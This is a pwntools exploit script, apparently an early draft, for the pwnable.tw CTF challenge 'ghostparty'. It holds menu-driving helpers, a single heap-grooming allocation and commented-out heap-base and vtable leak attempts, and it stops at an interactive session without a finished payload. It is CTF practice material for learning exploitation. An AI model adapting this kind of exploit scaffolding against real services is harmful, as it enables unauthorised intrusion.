#!/usr/bin/env python3
from pwn import *
from sys import argv
import enum
binary = ELF('ghostparty', checksec=0)
libc = ELF('libc_64.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10401)
else:
  p = process(
    ['/glibc/2.23/64/lib/ld-2.23.so', './ghostparty'],
    env={'LD_PRELOAD': 'libc_64.so.6'}
  )
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

class Ghost(enum.Enum):
  WEREWOLF = 1
  DEVIL = enum.auto()
  ZOMBIE = enum.auto()
  SKULL = enum.auto()
  MUMMY = enum.auto()
  DULLAHAN = enum.auto()
  VAMPIRE = enum.auto()
  YUKI = enum.auto()
  KASA = enum.auto()
  ALAN = enum.auto()

def ghost_add(name, age, message, ghost: Ghost, *args):
  sl(b'1', b'Your choice :')
  sl(name.encode(), b':')
  sl(str(age).encode(), b':')
  sl(message.encode(), b':')
  sl(str(ghost.value).encode(), b':')
  for arg in args:
    sl(str(arg).encode(), b':')

def ghost_info(index):
  sl(b'2', b'Your choice :')
  sl(str(index).encode(), b':')
  p.recvuntil(b'>-----GHOST INFO-----<\n')
  return b''.join([p.recvline() for _ in range(4)])

def ghost_parade():
  sl(b'3', b'Your choice :')
  p.recvuntil(b'>----Night Parade of One Hundred Demons----<\n')
  return p.recvuntil(b'>----Night Parade of One Hundred Demons----<\n')

def ghost_remove(index):
  sl(b'4', b'Your choice :')
  sl(str(index).encode(), b':')

def ghost_exit():
  sl(b'5', b'Your choice :')

ghost_add('a', 1, 'a', Ghost.VAMPIRE, b'A'*0x68, 3)
#heap_base = int.from_bytes(ghost_info(0).split(b' : ')[-1][:-1], 'little')#-0x12dc0
#log.info("Leaked heap base: %#lx" % heap_base)

#ghost_add('a', 1, 'a', Ghost.WEREWOLF, 0, 1)
#vtable_leak = int.from_bytes(ghost_info(0).split(b' : ')[-1][:-1], 'little')
#print(hex(vtable_leak))

p.interactive()

